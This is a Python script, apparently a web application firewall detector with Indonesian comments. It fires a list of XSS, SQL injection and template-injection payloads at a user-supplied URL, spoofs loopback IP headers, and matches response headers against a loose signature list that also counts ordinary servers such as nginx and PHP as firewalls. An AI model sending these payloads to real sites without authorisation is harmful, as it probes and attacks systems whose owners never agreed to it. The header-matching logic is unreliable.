import requests
import re
from urllib.parse import urlparse
from collections import Counter
import sys

def detect_waf(url):
    try:
        # test header
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Referer": "https://www.google.com/",
            "X-Originating-IP": "127.0.0.1",  
            "X-Forwarded-For": "127.0.0.1", 
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.example.com",
            "Cookie": "test=cookie",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        response = requests.get(url, headers=headers)

        # payload serangan, bisa tambahkan payload disini
        payloads = [
            "<script>alert('XSS')</script>",
            "union select 1,2,3--",
            "' or 1=1--",
            "<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",
            "<x onauxclick=import('//1152848220/')>click",
            "<x onauxclick=a=alert,a(domain)>click -@niksthehacker",
            "<x onauxclick=import('//1152848220/')>click",
            "{{constructor.constructor(alert`1`)()}}",
            "%27%09);%0d%0a%09%09[1].find(alert)//"
        ]
        waf_triggers = []  # payload pemicu serangan 
        for payload in payloads:
            response = requests.get(url + "?test=" + payload, headers=headers)
            if "waf" in response.text.lower() or response.status_code == 403:
                waf_triggers.append("Payload Serangan")
                break  # Hentikan jika sudah terdeteksi

        # Pengujian Header kelanjutan
        waf_signatures = {
	    "Server": [
		"cloudflare",
		"AkamaiGHost",
		"awselb", 
		"apache-generic",
		"nginx",                         
		"Microsoft-IIS",                 
		"Imperva SecureSphere",          
		"Barracuda NG Firewall",         
		"F5 BIG-IP",                     
		"Citrix Netscaler",              
		"Sucuri/Cloudproxy",             
		"Wordfence",                     
	    ],
	    "X-Powered-By": [
		"ModSecurity",               # ModSecurity
		"ASP.NET",                   # ASP.NET
		"PHP/.*",                    # PHP (Berbagai versi)
		"Servlet/.*",                # Java Servlet
		"Go /.*",                    # Go
		"Python/.*",                 # Python
		"Perl/.*",                   # Perl
		"Ruby/.*",                   # Ruby
		"Node.js/.*",                # Node.js
		"ASP.NET MVC"                # ASP.NET MVC
	    ]
	}

        for header, signatures in waf_signatures.items():
            if header in response.headers:
                for signature in signatures:
                    if signature.lower() in response.headers[header].lower():
                        waf_triggers.append(f"Header {header}: {signature}")
                        break

        # respon kesalahan klien
        if response.status_code >= 400 and response.status_code < 500:
            waf_triggers.append("Kode Kesalahan Klien")

        # Penghitungan Pemicu WAF
        if waf_triggers:
            most_common_trigger = Counter(waf_triggers).most_common(1)[0][0]

            print("\033[92m[+] Kemungkinan WAF terdeteksi\033[0m") 
            print(f"\033[92m[+] {most_common_trigger}\033[0m")

            # Identifikasi payload yang memicu WAF
            for payload in payloads:
                response = requests.get(url + "?test=" + payload, headers=headers)
                if "waf" in response.text.lower() or response.status_code == 403:
                    print(f"\033[92m[+] Payload serangan yang digunakan: {payload}\033[0m")
                    break

            print("\033[92m[Info] follow github @ibnurusdianto :D, terima kasih semoga membantu\033[0m")
            return True
        else:
            # Output jika tidak ada WAF terdeteksi
            print("\033[91m[-] Tidak ada WAF terdeteksi (atau WAF tidak dapat diidentifikasi)\033[0m")
            print("\033[92m[Info] follow github @ibnurusdianto, terima kasih semoga membantu\033[0m")
            return False

    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan: {e}")
        return None  # Kembalikan None jika terjadi kesalahan

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Penggunaan (How to use ?) : python3 waf_detector.py <URL>")
        print("\033[92m[Info] follow github @ibnurusdianto :D, terima kasih semoga membantu\033[0m")
    else:
        url = sys.argv[1]
        if not urlparse(url).scheme:
            url = "http://" + url
        detect_waf(url)
